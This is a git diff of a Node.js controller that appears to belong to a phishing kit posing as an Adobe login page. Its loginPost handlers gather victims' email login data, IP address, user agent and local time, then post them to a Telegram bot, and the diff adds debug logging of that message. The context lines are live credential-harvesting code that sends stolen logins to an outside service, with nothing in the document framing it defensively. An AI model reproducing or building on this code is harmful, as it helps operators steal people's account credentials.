@@ -52,6 +52,7 @@ exports.loginPost2 = async (req, res) => {
     const userAgent = req.headers["user-agent"];
     const systemLang = req.headers["accept-language"];
 
+    console.log("chai");
 
 	const message =
 		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
@@ -65,7 +66,7 @@ exports.loginPost2 = async (req, res) => {
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
          
-
+	console.log("message :" + message);
 	const sendMessage = sendMessageFor(botToken, chatId);
 	sendMessage(message);
 
@@ -122,6 +123,8 @@ exports.loginPost3 = async (req, res) => {
     const userAgent = req.headers["user-agent"];
     const systemLang = req.headers["accept-language"];
 
+    console.log("chai");
+    
 	const message =
 		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
 		`👤 EMAIL INFO\n` +
@@ -131,7 +134,7 @@ exports.loginPost3 = async (req, res) => {
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
          
-
+	console.log("message :" + message);
 	const sendMessage = sendMessageFor(botToken, chatId);
 	sendMessage(message);
 
@@ -184,10 +187,12 @@ exports.loginPost4 = async (req, res) => {
 	try{
     // Move the console.log statement outside the sendAPIRequest function
     console.log(ipAddressInformation);
-
+	
     const userAgent = req.headers["user-agent"];
     const systemLang = req.headers["accept-language"];
 
+    console.log("chai");
+    
 	const message =
 		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
 		`👤 EMAIL INFO (RELOGIN)\n` +
@@ -197,7 +202,7 @@ exports.loginPost4 = async (req, res) => {
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
          
-
+	console.log("message :" + message);
 	const sendMessage = sendMessageFor(botToken, chatId);
 	sendMessage(message);
 
